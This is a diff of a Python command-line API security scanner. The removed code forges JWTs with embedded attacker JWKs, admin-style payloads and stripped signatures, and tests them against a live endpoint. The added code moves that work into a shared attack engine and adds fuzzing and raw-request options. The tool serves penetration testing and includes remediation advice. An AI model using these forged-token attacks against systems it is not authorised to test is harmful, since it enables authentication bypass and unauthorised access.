-        for jwk_name, malicious_jwk in jwk_variations:
-            for payload_name, attack_payload in attack_payloads:
-                # 2️⃣ Modify header with inline JWK
-                new_header = copy.deepcopy(decoded['header'])
-                new_header['jwk'] = malicious_jwk
-                
-                # 3️⃣ & 4️⃣ Create token with embedded public key (remove signature)
-                header_b64 = base64.urlsafe_b64encode(json.dumps(new_header).encode()).decode().rstrip('=')
-                payload_b64 = base64.urlsafe_b64encode(json.dumps(attack_payload).encode()).decode().rstrip('=')
-                
-                # Remove signature since we're using our own key
-                inline_token = f"{header_b64}.{payload_b64}."
-                
-                attack_tokens.append((f"{jwk_name} + {payload_name}", inline_token, malicious_jwk, attack_payload))
-        
-        click.echo(f"✅ Generated {len(attack_tokens)} inline JWKS variants")
-        
-        # Display generated tokens
-        click.echo(f"\n🎯 Generated Inline JWKS Attack Tokens:")
-        click.echo("-" * 50)
-        for i, (name, token_val, jwk_used, payload_used) in enumerate(attack_tokens, 1):
-            click.echo(f"\n{i}. {name}:")
-            click.echo(f"   JWK: {json.dumps(jwk_used)}")
-            click.echo(f"   Token: {token_val}")
-        
-        # 5️⃣ Test against real endpoint if URL provided
-        if url and attack_tokens:
-            click.echo(f"\n5️⃣ Testing admin access against real endpoint...")
-            click.echo(f"🎯 Target: {url}")
-            
-            import asyncio
-            import httpx
-            
-            async def test_endpoint(token_name, token_value, jwk_used, payload_used):
-                try:
-                    headers = {'Authorization': f'Bearer {token_value}'}
-                    headers.update(custom_headers)
-                    
-                    async with httpx.AsyncClient(timeout=timeout, verify=True) as client:
-                        if data:
-                            response = await client.post(url, headers=headers, data=data)
-                        else:
-                            response = await client.get(url, headers=headers)
-                        
-                        click.echo(f"\n🧪 {token_name}:")
-                        click.echo(f"   Status: {response.status_code}")
-                        click.echo(f"   Length: {len(response.text)} bytes")
-                        
-                        # Check for success indicators
-                        success_indicators = []
-                        
-                        if response.status_code in [200, 201, 202]:
-                            success_indicators.append("2xx Success Status")
-                        
-                        response_text = response.text.lower()
-                        
-                        # Check for privileged access
-                        if any(indicator in response_text for indicator in ['admin', 'dashboard', 'privileged', 'welcome']):
-                            success_indicators.append("Privileged Content Detected")
-                        
-                        if 'error' not in response_text and 'unauthorized' not in response_text and 'forbidden' not in response_text:
-                            success_indicators.append("No Error Messages")
-                        
-                        # Check for JWK processing
-                        if any(indicator in response_text for indicator in ['jwk', 'key', 'signature']):
-                            success_indicators.append("JWK Processing Detected")
-                        
-                        if success_indicators:
-                            click.echo(f"   🚨 CRITICAL VULNERABILITY CONFIRMED!")
-                            click.echo(f"   💀 Evidence: {', '.join(success_indicators)}")
-                            click.echo(f"   💀 Server trusts embedded JWK!")
-                            click.echo(f"   💀 Complete cryptographic control achieved!")
-                            click.echo(f"   💀 Payload used: {json.dumps(payload_used)}")
-                        else:
-                            click.echo(f"   ✅ Attack blocked - server properly rejects inline JWKs")
-                            
-                except Exception as e:
-                    click.echo(f"   ❌ Request failed: {e}")
-            
-            # Test all attack tokens
-            async def run_all_tests():
-                for token_name, token_value, jwk_used, payload_used in attack_tokens:
-                    await test_endpoint(token_name, token_value, jwk_used, payload_used)
-            
-            asyncio.run(run_all_tests())
-        
-        else:
-            click.echo(f"\n⚠️  Manual Testing Required:")
-            click.echo("• Test each token against your API")
-            click.echo("• If ANY token is accepted, server trusts embedded JWK")
-            click.echo("• Attacker can sign tokens with their own key")
-            click.echo("• Proper implementation should REJECT all inline JWKs")
-        
-        # Display sample malicious JWK
-        click.echo(f"\n💡 Sample Malicious JWK (embedded in token):")
-        click.echo("-" * 45)
-        sample_jwk = jwk_variations[0][1]  # Use first RSA key as example
-        click.echo(json.dumps(sample_jwk, indent=2))
-        
-        # Summary and recommendations
-        click.echo(f"\n" + "="*60)
-        click.echo("🔥 ATTACK SUMMARY")
-        click.echo("="*60)
-        click.echo(f"✅ Inline JWKS variants generated: {len(attack_tokens)}")
-        if url:
-            click.echo(f"✅ Endpoint testing completed")
-        
+        # Route generation + execution through the single-source-of-truth engine
+        # (Requirements 14.2, 14.3, 17.1, 19.2). The engine owns the curated
+        # inline-JWK set and signs with the resolved key.
+        _run_jwt_vector(token, AttackType.INLINE_JWKS, url, custom_headers,
+                        data, timeout)
+
         click.echo(f"\n💡 REMEDIATION:")
         click.echo("• NEVER trust inline JWK parameters in JWT headers")
         click.echo("• Implement strict JWK source validation")
@@ -4326,22 +5238,31 @@ def jwt_test_inline_jwks(ctx, token, url, header, data, timeout):
         click.echo("• Reject tokens with jwk, jku, x5u, or x5c parameters")
         click.echo("• Implement proper key management with trusted sources")
         click.echo("• Use certificate pinning for key validation")
-        
+
     except Exception as e:
         click.echo(f"❌ Error: {e}", err=True)
         sys.exit(1)
 
 
 @jwt.command('attack-test')
-@click.argument('token')
-@click.option('--url', '-u', required=True, help='Target URL to test JWT attacks against')
+@click.argument('token', required=False)
+@click.option('--url', '-u', help='Target URL to test JWT attacks against')
 @click.option('--header', '-H', multiple=True, help='Custom headers (format: "Name: Value"). Can be used multiple times.')
 @click.option('--data', '-d', help='POST data for request body (JSON format recommended)')
 @click.option('--timeout', default=30, help='Request timeout in seconds (default: 30)')
 @click.option('--no-ssl-verify', is_flag=True, help='Disable SSL certificate verification for testing')
 @click.option('--max-retries', default=3, help='Maximum retry attempts for failed requests (default: 3)')
+@click.option('--fuzz-target', 'fuzz_target',
+              help='Claim or header name to fuzz with values from --vector-file (Req 63.1)')
+@click.option('--vector-file', 'vector_file', type=click.Path(),
+              help='File of fuzz values (one per line) substituted into --fuzz-target (Req 63.6)')
+@click.option('--raw-request', 'raw_request', type=click.Path(),
+              help='Raw HTTP request file supplying the request context and JWT (Req 67.1)')
+@click.option('--canary',
+              help='Expected-success string that corroborates (never replaces) analyzer success (Req 67.3)')
 @click.pass_context
-def jwt_attack_test(ctx, token, url, header, data, timeout, no_ssl_verify, max_retries):
+def jwt_attack_test(ctx, token, url, header, data, timeout, no_ssl_verify,
+                    max_retries, fuzz_target, vector_file, raw_request, canary):
     """Comprehensive JWT attack testing against live endpoints
     
     Performs automated security testing of JWT tokens against live API endpoints
@@ -4470,6 +5391,72 @@ def jwt_attack_test(ctx, token, url, header, data, timeout, no_ssl_verify, max_r
     • Output format consistent with other APILeak reporting
     """
     try:
+        # ------------------------------------------------------------------
+        # Resolve new-option inputs BEFORE any request is issued (Reqs 63.6,
+        # 67.1, 67.2). Each source is consumed up-front so an unreadable
+        # Vector_File or an unparseable/token-less Raw_Request_Input aborts the
+        # command with a descriptive error naming the offending file, and no
+        # HTTP request is ever attempted.
+        #
+        # When no new option is supplied the token/url/headers/data resolve to
+        # exactly the pre-existing single-token behavior (Req 67.5).
+        # ------------------------------------------------------------------
+        raw_parsed = None
+        if raw_request:
+            try:
+                raw_parsed = parse_raw_request(raw_request)
+            except ValueError as e:
+                click.echo(f"❌ {e}", err=True)
+                sys.exit(1)
+            # The parsed request supplies the JWT and the request context.
+            token = raw_parsed.token
+            if not url:
+                url = raw_parsed.url
+            if not data:
+                data = raw_parsed.body
+
+        # A token must come from either the positional argument or the raw
+        # request file.
+        if not token:
+            click.echo(
+                "❌ No JWT token supplied. Provide TOKEN or --raw-request FILE.",
+                err=True)
+            sys.exit(1)
+
+        # A live target is required for attack execution (preserved from the
+        # original --url requirement); it may originate from --url or the raw
+        # request file.
+        if not url:
+            click.echo(
+                "❌ No target URL supplied. Provide --url or a --raw-request "
+                "file with a Host header.",
+                err=True)
+            sys.exit(1)
+
+        # Read the Vector_File up-front so an unreadable file aborts before any
+        # request, naming the file (Req 63.6). Fuzzing needs both a target name
+        # and a value file; requiring them together avoids a silently inert
+        # option.
+        fuzz_values = None
+        if vector_file and not fuzz_target:
+            click.echo(
+                "❌ --vector-file requires --fuzz-target naming the claim or "
+                "header to fuzz.",
+                err=True)
+            sys.exit(1)
+        if fuzz_target and not vector_file:
+            click.echo(
+                "❌ --fuzz-target requires --vector-file supplying the fuzz "
+                "values.",
+                err=True)
+            sys.exit(1)
+        if vector_file:
+            try:
+                fuzz_values = read_vector_file(vector_file)
+            except ValueError as e:
+                click.echo(f"❌ {e}", err=True)
+                sys.exit(1)
+
         # Validate JWT token first
         try:
             decoded_token = decode_jwt(token)
@@ -4488,8 +5475,12 @@ def jwt_attack_test(ctx, token, url, header, data, timeout, no_ssl_verify, max_r
             click.echo(f"❌ Invalid JWT token: {e}", err=True)
             sys.exit(1)
         
-        # Parse custom headers
+        # Parse custom headers. When a raw request file was supplied its parsed
+        # headers seed the request context (Req 67.1); explicit -H options then
+        # override on a per-name basis.
         custom_headers = {}
+        if raw_parsed is not None:
+            custom_headers.update(raw_parsed.headers)
         for h in header:
             if ':' not in h:
                 click.echo(f"❌ Invalid header format: {h}. Use 'Name: Value' format.", err=True)
@@ -4515,65 +5506,69 @@ def jwt_attack_test(ctx, token, url, header, data, timeout, no_ssl_verify, max_r
         click.echo(f"Timeout: {timeout}s")
         click.echo(f"SSL Verification: {'Disabled' if no_ssl_verify else 'Enabled'}")
         click.echo(f"Max Retries: {max_retries}")
+        if raw_request:
+            click.echo(f"Raw Request File: {raw_request}")
+        if fuzz_target:
+            click.echo(f"Fuzz Target: {fuzz_target} "
+                       f"({len(fuzz_values or [])} value(s) from {vector_file})")
+        if canary:
+            click.echo("Canary: (supplied — corroborates analyzer success)")
         click.echo("")
         
-        # Import and run the JWT attack orchestrator
-        import asyncio
-        from utils.jwt_attack_orchestrator import JWTAttackOrchestrator
-        
+        # Route all attack-token generation and execution through the single-
+        # source-of-truth JWTAttackEngine (Requirements 14.2, 14.3), issuing HTTP
+        # through the shared HTTPRequestEngine (Requirement 17.1). Success is
+        # decided by the engine's response analyzer, not keyword presence
+        # (Requirements 19.1, 19.2).
+        from utils.http_client import HTTPRequestEngine, RateLimiter, RetryConfig
+        from core.config import RateLimitConfig
+
         async def run_attack_test():
-            # Initialize orchestrator
-            orchestrator = JWTAttackOrchestrator(
-                target_url=url,
-                original_token=token,
-                custom_headers=custom_headers,
-                post_data=data,
-                timeout=timeout,
-                verify_ssl=not no_ssl_verify,
-                max_retries=max_retries
-            )
-            
-            # Execute all attacks
-            click.echo("🚀 Starting JWT Attack Testing...")
-            click.echo("="*50)
-            
-            attack_summary = await orchestrator.execute_all_attacks()
-            
+            rate_limiter = RateLimiter(RateLimitConfig())
+            retry_config = RetryConfig(max_attempts=max_retries)
+            http_engine = HTTPRequestEngine(
+                rate_limiter, retry_config, timeout=timeout,
+                verify_ssl=not no_ssl_verify)
+            try:
+                engine = _make_jwt_engine(
+                    token, url, custom_headers, data, http_engine=http_engine,
+                    fuzz_target=fuzz_target, fuzz_values=fuzz_values,
+                    canary_value=canary)
+
+                click.echo("🚀 Starting JWT Attack Testing...")
+                click.echo("="*50)
+
+                attack_summary = await engine.execute_all()
+            finally:
+                await http_engine.close()
+
             # Display results summary
             click.echo("\n" + "="*60)
             click.echo("JWT Attack Testing Results")
             click.echo("="*60)
-            
+
             session = attack_summary.session
             click.echo(f"Session ID: {session.session_id}")
             click.echo(f"Duration: {session.duration:.2f}s" if session.duration else "Duration: N/A")
             click.echo(f"Total Attacks: {session.total_attacks}")
             click.echo(f"Successful Attacks: {session.successful_attacks}")
             click.echo(f"Success Rate: {session.success_rate:.1f}%")
-            
-            # Show vulnerability summary
+
+            # Show vulnerability summary (analyzer-based, Req 19.1/19.3)
             if attack_summary.vulnerabilities_found:
                 click.echo(f"\n🚨 VULNERABILITIES FOUND: {len(attack_summary.vulnerabilities_found)}")
                 for vuln in attack_summary.vulnerabilities_found:
                     severity_icon = "🔴" if vuln.vulnerability_assessment.severity.value == "Critical" else "🟠" if vuln.vulnerability_assessment.severity.value == "High" else "🟡"
-                    click.echo(f"  {severity_icon} {vuln.attack_type.value}: {vuln.vulnerability_assessment.vulnerability_type} ({vuln.vulnerability_assessment.severity.value})")
-            
+                    click.echo(f"  {severity_icon} {vuln.attack_type.value}: {vuln.vulnerability_assessment.vulnerability_type} ({vuln.vulnerability_assessment.severity.value}, confidence {vuln.vulnerability_assessment.confidence_score:.2f})")
+
             if attack_summary.potential_vulnerabilities:
                 click.echo(f"\n⚠️  POTENTIAL VULNERABILITIES: {len(attack_summary.potential_vulnerabilities)}")
                 for vuln in attack_summary.potential_vulnerabilities:
                     click.echo(f"  🟡 {vuln.attack_type.value}: {vuln.vulnerability_assessment.vulnerability_type} (Confidence: {vuln.vulnerability_assessment.confidence_score:.2f})")
-            
+
             if not attack_summary.vulnerabilities_found and not attack_summary.potential_vulnerabilities:
                 click.echo("\n✅ No vulnerabilities detected")
-            
-            # Show storage location
-            click.echo(f"\n📁 Results saved to: {orchestrator.storage_manager.session_dir}")
-            click.echo("Files generated:")
-            click.echo("  • Attack tokens (*.jwt)")
-            click.echo("  • Response details (*.json)")
-            click.echo("  • Human-readable report (attack_report.txt)")
-            click.echo("  • Machine-readable report (attack_summary.json)")
-            
+
             # Exit with appropriate code based on findings
             if attack_summary.has_critical_findings:
                 click.echo("\n🔴 Exiting with code 2 due to critical vulnerabilities")
@@ -4584,7 +5579,7 @@ def jwt_attack_test(ctx, token, url, header, data, timeout, no_ssl_verify, max_r
             else:
                 click.echo("\n✅ Attack testing completed successfully")
                 sys.exit(0)
-        
+
         # Run the async attack test
         asyncio.run(run_attack_test())
         
@@ -4610,9 +5605,12 @@ def jwt_attack_test(ctx, token, url, header, data, timeout, no_ssl_verify, max_r
 @click.option('--rate-limit', type=int, help='Requests per second limit')
 @click.pass_context
 def main(ctx, config, target, output, log_level, log_file, json_logs, modules, rate_limit):
-    """Legacy main command - redirects to full scan"""
-    ctx.invoke(full, config=config, target=target, output=output, log_level=log_level,
-               log_file=log_file, json_logs=json_logs, modules=modules, rate_limit=rate_limit)
+    """Legacy main command - redirects to scan (deprecated)"""
+    _emit_deprecation_notice('main', 'scan')
+    # Forward the parsed options to ``scan`` so the run and exit code are
+    # identical to the non-deprecated invocation; Click fills defaults for
+    # ``scan`` options not present on ``main`` (Requirements 6.3, 6.7).
+    ctx.forward(scan)
 
 
 # Severity ladder for CI/CD gate evaluation, ordered from highest to lowest.
